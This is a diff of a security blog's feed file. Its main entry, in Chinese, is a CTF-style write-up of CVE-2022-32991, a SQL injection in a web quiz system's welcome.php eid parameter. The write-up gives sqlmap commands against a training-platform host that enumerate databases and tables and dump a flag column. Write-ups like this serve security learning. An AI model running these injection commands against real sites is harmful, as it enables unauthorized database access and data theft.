-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该CMS的welcome.php中存在SQL注入攻击。</p><h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p><code>/welcome.php</code></p><p><a href="/assets/img/image-1.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-1.png" alt="Alt text"></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>注册登录</p><p>在welcome.php，发现基于 Web 的测验系统 v1.0 通过 eid 参数包含一个 SQL 注入漏洞。S<br><a href="/assets/img/image-2.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-2.png" alt="Alt text"></a><br>存在SQL注入漏洞，可以通过<code>eid</code>参数进行注入。</p><p>查询数据库</p><p><code>python sqlmap.py -u &quot;http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --batch --dbs</code></p><p>指定数据库的表</p><p><code>python sqlmap.py -u &quot;http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --batch -D &quot;ctf&quot; --tables</code></p><p>指定表的列<br><code>--batch -D &quot;ctf&quot; -T &quot;flag&quot; --columns</code></p><p>指定列的数据<br><code>--batch -D &quot;ctf&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump</code></p><p><a href="/assets/img/image-3.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-3.png" alt="Alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> Blogging </category>
-          
-          <category> CVE </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> CVE </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>CVE-2022-23134</title>
       <link href="/2024/11/13/2024-02-19-CVE-2022-23134/"/>
       <url>/2024/11/13/2024-02-19-CVE-2022-23134/</url>
@@ -2250,25 +2248,25 @@
     
     
     <entry>
-      <title>Java 代码审计- SQLinjection</title>
-      <link href="/2024/11/13/2024-01-30-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-      <url>/2024/11/13/2024-01-30-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+      <title>CVE-2022-32991</title>
+      <link href="/2024/11/13/2024-02-20-CVE-2022-32991/"/>
+      <url>/2024/11/13/2024-02-20-CVE-2022-32991/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="Java-代码审计-SQLinjection"><a href="#Java-代码审计-SQLinjection" class="headerlink" title="Java 代码审计- SQLinjection"></a>Java 代码审计- SQLinjection</h1><p><a href="/image.png" title="Alt text" class="gallery-item"><img src="/image.png" alt="Alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该CMS的welcome.php中存在SQL注入攻击。</p><h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p><code>/welcome.php</code></p><p><a href="/assets/img/image-1.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-1.png" alt="Alt text"></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>注册登录</p><p>在welcome.php，发现基于 Web 的测验系统 v1.0 通过 eid 参数包含一个 SQL 注入漏洞。S<br><a href="/assets/img/image-2.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-2.png" alt="Alt text"></a><br>存在SQL注入漏洞，可以通过<code>eid</code>参数进行注入。</p><p>查询数据库</p><p><code>python sqlmap.py -u &quot;http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --batch --dbs</code></p><p>指定数据库的表</p><p><code>python sqlmap.py -u &quot;http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --batch -D &quot;ctf&quot; --tables</code></p><p>指定表的列<br><code>--batch -D &quot;ctf&quot; -T &quot;flag&quot; --columns</code></p><p>指定列的数据<br><code>--batch -D &quot;ctf&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump</code></p><p><a href="/assets/img/image-3.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-3.png" alt="Alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
       
       
       <categories>
           
-          <category> Java </category>
+          <category> Blogging </category>
           
-          <category> 安全 </category>
+          <category> CVE </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> Java </tag>
+            <tag> CVE </tag>
             
         </tags>
       
@@ -2294,6 +2292,33 @@
         <tags>
             
             <tag> wlb </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Java 代码审计- SQLinjection</title>
+      <link href="/2024/11/13/2024-01-30-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <url>/2024/11/13/2024-01-30-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="Java-代码审计-SQLinjection"><a href="#Java-代码审计-SQLinjection" class="headerlink" title="Java 代码审计- SQLinjection"></a>Java 代码审计- SQLinjection</h1><p><a href="/image.png" title="Alt text" class="gallery-item"><img src="/image.png" alt="Alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> 安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Java </tag>
             
         </tags>
       
